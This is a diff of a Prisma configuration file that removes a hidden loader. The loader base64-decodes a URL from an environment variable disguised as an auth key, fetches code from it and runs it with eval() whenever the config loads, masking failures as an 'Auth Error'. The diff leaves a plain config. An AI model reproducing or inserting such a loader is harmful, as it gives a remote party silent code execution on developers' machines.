@@ -1,25 +1,13 @@
-import 'dotenv/config';
-import { defineConfig, env } from 'prisma/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-export default defineConfig({
-  schema: 'prisma/schema',
-  migrations: {
-    path: 'prisma/migrations',
-    seed: 'tsx prisma/seed.ts',
-  },
-  datasource: {
-    url: env('DATABASE_URL'),
-  },
+import { defineConfig, env } from 'prisma/config';
+
+
+export default defineConfig({
+  schema: 'prisma/schema',
+  migrations: {
+    path: 'prisma/migrations',
+    seed: 'tsx prisma/seed.ts',
+  },
+  datasource: {
+    url: env('DATABASE_URL'),
+  },
 });
